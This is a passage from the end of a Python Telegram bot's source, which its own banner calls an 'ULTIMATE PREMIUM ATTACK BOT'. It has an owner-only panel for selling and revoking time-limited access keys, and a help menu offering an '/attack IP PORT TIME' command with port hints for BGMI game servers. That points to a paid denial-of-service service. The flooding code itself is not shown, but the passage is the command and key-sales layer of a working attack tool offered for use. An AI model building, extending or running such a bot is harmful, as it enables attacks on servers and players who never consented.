                f"⏱️ 30m | 24h | 7d | 2w | 1mo",
                reply_markup=back_kb()
            )
    
    elif data == "admin_menu":
        if uid != OWNER_ID: await cb.answer("Owner only!"); return
        await cb.message.edit_text(
            f"👑 **ADMIN PANEL**\n\n{LINE}\n"
            f"🔑 `/genkey NAME TIME`\n"
            f"📋 `/keys`\n"
            f"🗑️ `/delkey KEY`\n"
            f"🚫 `/blockkey KEY`\n"
            f"✅ `/unblockkey KEY`\n"
            f"👤 `/blockuser ID`\n"
            f"🔄 `/clearexpired`\n"
            f"📊 `/stats`\n"
            f"📹 `/addvideo` (reply)\n\n"
            f"⏱️ Times: 30m,24h,7d,2w,1mo",
            reply_markup=back_kb()
        )
    
    elif data == "help":
        await cb.message.edit_text(
            f"ℹ️ **HELP**\n\n{LINE}\n"
            f"⚔️ `/attack IP PORT TIME`\n"
            f"🛑 `/stop`\n📊 `/status`\n"
            f"🔑 `/redeem KEY`\n"
            f"📹 `/videos`\n\n"
            f"🎮 BGMI: 7000-15000\n"
            f"🔑 Keys: 30m to 1mo",
            reply_markup=back_kb()
        )

# ═══════════════ AUTO EXPIRE CHECKER ═══════════════
async def auto_expire_checker():
    while True:
        await asyncio.sleep(300)
        removed = remove_expired()
        if removed > 0: logger.info(f"🔄 Auto-removed {removed} expired users")

# ═══════════════ INIT ═══════════════
for f, d in [(VIDEO_DB, []), (USERS_DB, {"premium": [], "keys": {}, "history": {}}), 
             (KEYS_DB, {}), (BLOCKED_DB, []), (LOGS_DB, [])]:
    if not os.path.exists(f): jsave(f, d)

os.makedirs("downloads", exist_ok=True)

loop = asyncio.get_event_loop()
loop.create_task(auto_expire_checker())

print(f"""
╔══════════════════════════════════════╗
║  💎 ULTIMATE PREMIUM ATTACK BOT 💎  ║
║  Unique Keys | Block | Video Auth   ║
╚══════════════════════════════════════╝
✅ Bot Ready!
🔑 Unique Key System Active
🚫 Block System Active
🎬 Video Auth Active
📊 Advanced Logging Active
""")

if __name__ == "__main__":
    app.run()
